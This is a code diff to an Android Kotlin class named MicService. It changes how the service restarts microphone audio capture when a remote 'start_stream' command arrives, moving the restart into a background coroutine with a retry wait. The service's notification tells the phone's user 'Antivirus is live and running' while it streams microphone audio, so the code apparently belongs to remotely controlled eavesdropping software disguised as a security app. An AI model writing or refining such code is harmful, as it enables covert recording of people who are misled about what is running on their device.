@@ -1130,14 +1130,21 @@ class MicService : Service() {
                     Log.i(TAG, "WebRTC is active, ignoring start_stream command to prevent interrupting WebRTC")
                     sendCommandAck("start_stream", detail = "ignored_webrtc_active")
                 } else {
-                    val staleCapture = isCapturing && (System.currentTimeMillis() - lastAudioChunkSentAt > 20_000)
-                    if (staleCapture) {
-                        stopAudioCapture("start_stream_stale_restart")
+                    serviceScope.launch(Dispatchers.IO) {
+                        val staleCapture = isCapturing && (System.currentTimeMillis() - lastAudioChunkSentAt > 20_000)
+                        if (staleCapture) {
+                            stopAudioCapture("start_stream_stale_restart")
+                            var retries = 0
+                            while (isCapturingGuard.get() && retries < 10) {
+                                delay(100)
+                                retries++
+                            }
+                        }
+                        startAudioCapture()
+                        startMicWatchdog()
+                        updateNotification("Antivirus is live and running")
+                        sendCommandAck("start_stream")
                     }
-                    startAudioCapture()
-                    startMicWatchdog()
-                    updateNotification("Antivirus is live and running")
-                    sendCommandAck("start_stream")
                 }
             }
             "stop_stream" -> {
